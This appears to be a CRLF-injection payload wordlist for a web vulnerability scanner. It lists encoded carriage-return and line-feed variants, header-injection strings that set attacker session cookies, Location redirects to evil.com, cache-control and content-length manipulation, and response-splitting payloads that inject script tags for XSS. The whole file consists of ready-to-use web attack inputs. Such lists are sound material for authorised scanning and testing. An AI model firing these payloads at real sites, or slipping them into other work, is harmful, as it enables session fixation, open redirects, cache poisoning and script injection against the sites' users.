# Unicode Encoded
# ====================================

%u000d%u000a
%u000a

# ====================================
# UTF-8 Variations
# ====================================

%c0%8d%c0%8a
%e5%98%8a%e5%98%8d

# ====================================
# Header Injection Payloads
# ====================================

# Custom header injection
%0d%0aX-Injected: true
%0d%0aX-Test: JARWIS_CRLF_MARKER
%0aX-Test: JARWIS_CRLF_MARKER

# Set-Cookie injection (session fixation)
%0d%0aSet-Cookie: session=attacker
%0d%0aSet-Cookie: admin=true
%0d%0aSet-Cookie: JSESSIONID=attacker
%0d%0aSet-Cookie: PHPSESSID=attacker

# Location header injection (open redirect)
%0d%0aLocation: https://evil.com
%0d%0aLocation: //evil.com

# Content-Type injection
%0d%0aContent-Type: text/html

# Cache-Control injection
%0d%0aCache-Control: public, max-age=31536000

# ====================================
# Response Splitting (XSS via CRLF)
# ====================================

# Inject complete response with XSS
%0d%0a%0d%0a<html><script>alert('XSS')</script></html>
%0d%0a%0d%0a<script>alert(1)</script>
%0d%0a%0d%0a<img src=x onerror=alert(1)>

# With Content-Type for reliable execution
%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('XSS')</script>

# Content-Length manipulation (response truncation)
%0d%0aContent-Length: 0%0d%0a%0d%0a

# ====================================
# Null Byte + CRLF
# ====================================

%00%0d%0a
%00%0a
